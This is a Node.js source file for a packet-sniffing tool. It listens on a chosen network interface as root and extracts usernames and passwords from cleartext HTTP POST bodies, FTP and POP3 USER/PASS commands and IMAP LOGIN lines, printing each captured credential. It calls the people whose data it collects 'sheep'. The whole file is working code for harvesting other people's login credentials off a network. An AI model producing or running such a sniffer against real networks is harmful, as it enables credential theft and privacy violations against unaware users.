var qs = require('querystring');
var protocol = require('./ports_table');
var pcap = require('./node_modules/pcap');

function GetHTTPLoginAccount(data) {
  var account = 'None';

  if (data.account) {
    account = data.account;
  } else if (data.identification) {
    account = data.identification;
  } else if (data.username) {
    account = data.username;
  } else if (data.id) {
    account = data.id;
  } else if (data.os_username) {
    account = data.os_username;
  } else if (data.txtAccount) {
    account = data.txtAccount;
  } else if (data.email) {
    account = data.email;
  } else if (data.loginAccount) {
    account = data.loginAccount;
  } else {
    if (Object.keys(data).length !== 0) {
      console.log('[-] Can not find account pattern.');
      console.log('[-] Check querystring in %j', data);
    }
  }
  return account;
}

function GetHTTPLoginPassword(data) {
  var password = 'None';

  if (data.password) {
    password = data.password;
  } else if (data.os_password) {
    password = data.os_password;
  } else if (data.txtPwd) {
    password = data.txtPwd;
  } else if (data.loginPasswd) {
    password = data.loginPasswd;
  } else {
    if (Object.keys(data).length !== 0) {
      console.log('[-] Can not find password pattern.');
      console.log('[-] Check querystring in %j', data);
    }
  }
  return password;
}

function HTTPPostParser(packet) {
  var linkLayer = packet.payload;
  var networkLayer = packet.payload.payload;
  var tranportLayer = packet.payload.payload.payload;

  var data = tranportLayer.data.toString('ascii');
  // DEBUG usage
  // console.log(data);

  // Source MAC address
  var shost = linkLayer.shost.toString('ascii');

  // Source IP address
  var saddr = networkLayer.saddr.toString('ascii');

  // Dst IP address
  var daddr = networkLayer.daddr.toString('ascii');

  // Source port
  var sport = tranportLayer.sport;

  // Dst port
  var dport = tranportLayer.dport;

  var isPOST = data.indexOf('POST');
  var isGET = data.indexOf('GET');

  if (isPOST > -1) {
    // HTTP POST request packet
    // HTTP header with content
    var headerContent = data.split('\r\n');
    // console.log(data);

    // console.log(headerContent);

    // returns the last element (querystring) and removes it from the array
    var lastContent = headerContent.pop();

    var sheepInfo = qs.parse(lastContent);

    // For DEGUG print
    // console.log(sheepInfo);

    var account = GetHTTPLoginAccount(sheepInfo);
    var password = GetHTTPLoginPassword(sheepInfo);

    ConsolePrinter(shost, saddr, daddr, sport, dport, account, password);
  } else if(isGET > -1) {
    // HTTP GET request packet

  } else{
    // Small packets size may be the remaining of last packet.
    if (tranportLayer.data_bytes < 200){
      // console.log(data);
      var headerContent = data.split('\r\n');
      var lastContent = headerContent.pop();
      var sheepInfo = qs.parse(lastContent);
      // Because last HTTP POST request packet size is too much larger.
      // It may lead packet been fragmented and querystring will be in
      // next packet. In the next packet size will extremely small
      // and querystring may stay in here.
      var account = GetHTTPLoginAccount(sheepInfo);
      var password = GetHTTPLoginPassword(sheepInfo);
      ConsolePrinter(shost, saddr, daddr, sport, dport, account, password);
    }

  }

}

function GetFTPPOPLoginPass(packet) {
  var linkLayer = packet.payload;
  var networkLayer = packet.payload.payload;
  var tranportLayer = packet.payload.payload.payload;

  var data = tranportLayer.data.toString('ascii');

  // Source MAC address
  var shost = linkLayer.shost.toString('ascii');

  // Source IP address
  var saddr = networkLayer.saddr.toString('ascii');

  // Dst IP address
  var daddr = networkLayer.daddr.toString('ascii');

  // Source port
  var sport = tranportLayer.sport;

  // Dst port
  var dport = tranportLayer.dport;

  var ftpUserRE = /^USER (.*)$/i;
  var ftpPASSRE = /^PASS (.*)$/i;
  var splitted = data.split('\r\n');

  // Check the first element in splitted has user/pass or not case-insensitive
  var isUSER = splitted[0].toLowerCase().indexOf('user');
  var isPASS = splitted[0].toLowerCase().indexOf('pass');

  if (isUSER > -1) {
    var user = splitted[0].match(ftpUserRE);
    if (user !== null) {
      ConsolePrinter(shost, saddr, daddr, sport, dport, user[1], null);
    }
  }

  if (isPASS > -1) {
    var pass = splitted[0].match(ftpPASSRE);
    if (pass !== null) {
      ConsolePrinter(shost, saddr, daddr, sport, dport, null, pass[1]);
    }
  }

  // Another way to check USER and PASS but I think this is inefficient.
  // if (isUSER > -1 || isPASS > -1) {
  //   var user = splitted[0].match(ftpUserRE);
  //   var pass = splitted[0].match(ftpPASSRE);
  //   if (user !== null) {
  //     ConsolePrinter(shost, saddr, daddr, sport, dport, user[1], null);
  //   }
  //   if (pass !== null) {
  //     ConsolePrinter(shost, saddr, daddr, sport, dport, null, pass[1]);
  //   }
  // }

}

function GetIMAPLoginPass(packet) {
  var linkLayer = packet.payload;
  var networkLayer = packet.payload.payload;
  var tranportLayer = packet.payload.payload.payload;
  var data = tranportLayer.data.toString('ascii');

  // Source MAC address
  var shost = linkLayer.shost.toString('ascii');

  // Source IP address
  var saddr = networkLayer.saddr.toString('ascii');

  // Dst IP address
  var daddr = networkLayer.daddr.toString('ascii');

  // Source port
  var sport = tranportLayer.sport;

  // Dst port
  var dport = tranportLayer.dport;

  var imapUserPassRE = /^LOGIN (.*) (.*)$/i;
  // console.log(data);
  var splitted = data.split('\r\n');


  // Check the first element in splitted has login or not case-insensitive
  var isLogin = splitted[0].toLowerCase().indexOf('login');

  if (isLogin > -1) {
    var login = splitted[0].match(imapUserPassRE);
    ConsolePrinter(shost, saddr, daddr, sport, dport, login[1], login[2]);
  }
}

function ConsolePrinter(shost, srcIP, dstIP, sport, dport, account, password) {
  if (account !== null && account !== 'None') {
    console.log('[%s:%d -> %s:%d] %s Account: %s', srcIP, sport, dstIP, dport, protocol[dport], account);
  }
  if (password !== null && password !== 'None') {
    console.log('[%s:%d -> %s:%d] %s Password: %s', srcIP, sport, dstIP, dport, protocol[dport], password);
  }
}

function StartCapture() {
  if (process.getuid() !== 0) {
    console.log('[*] Please run as root');
    process.exit(1);
  }

  var nic = process.argv[2];

  if (!nic) {
    console.log('[*] Specify an interface name for capturing.');
    process.exit(1);
  } else {
    var pcap_session = pcap.createSession(nic, 'ip proto \\tcp');
    console.log('[*] Using interface: %s', pcap_session.device_name);
    pcap_session.on('packet', function (raw_packet) {

      var packet = pcap.decode.packet(raw_packet);
      // console.log(packet);

      var tranportLayer = packet.payload.payload.payload;
      var isHTTP = tranportLayer.dport === 80 && tranportLayer.data !== null;
      var isFTP = tranportLayer.dport === 21  && tranportLayer.data !== null;
      var isPOP3 = tranportLayer.dport === 110  && tranportLayer.data !== null;
      var isIMAP = tranportLayer.dport === 143  && tranportLayer.data !== null;

      // For all protocols we interested and also data not null
      if (isHTTP) {
        HTTPPostParser(packet);
      } else if (isFTP) {
        GetFTPPOPLoginPass(packet);
      } else if (isPOP3) {
        GetFTPPOPLoginPass(packet);
      } else if (isIMAP) {
        GetIMAPLoginPass(packet);
      } else {

      }
    });
  }
}

StartCapture();
